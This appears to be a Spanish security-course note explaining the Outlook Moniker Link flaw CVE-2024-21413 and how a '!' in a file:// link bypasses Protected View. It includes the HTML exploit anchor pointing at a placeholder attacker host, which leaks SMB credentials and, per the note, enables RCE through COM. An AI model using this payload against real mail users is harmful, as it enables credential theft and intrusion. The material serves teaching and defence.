---
layout: apunte
title: "2. Moniker Link (CVE-2024-21413)"
---

Outlook puede renderizar emails como HTML. Además, Outlook puede parsear hiperlinks como HTTP y HTTPS. De cualquier forma, también puede abrir enlaces especificando aplicaciones, conocido como Moniker Links. Normalmente, Outlook lanza un mensaje de riesgo de seguridad cuando se disparan aplicaciones externas.

!**134.jpg**

Este pop-up es el resultado del modo "Vista Protegida" de Outlook. Este modo abre emails que contienen archivos adjuntos, hiperlinks y demás en modo de sólo lectura, bloqueando cosas como las macros.

Al usar `file://` en el moniker link podemos decirle a Outlook que acceda a un archivo, como uno en la red compartida (`a href="file://IP_ATACANTE/test>Click me</a>`). El protocolo SMB es usado, lo que implica usar credenciales locales para autentificación. Sin embargo, el modo "vista protegida" atrapa y bloquea este intento.

```html
<p><a href="file://IP_ATACANTE/test">Click me</a></p>
```

La vulnerabilidad aquí existe al modificar el hiperenlace para incluir el carácter especial `!`, lo que resulta en el bypass del modo protegido de Outlook.

```html
<p><a href="file://IP_ATACANTE/test!exploit">Click me</a></p>
```

Como atacantes podemos ofrecer este link para el ataque. La compartición no tiene por qué existir en el dispositivo remoto. La ejecución remota de comandos (RCE) es posible porque el Moniker Link usa el modelo de objetos componentes (COM).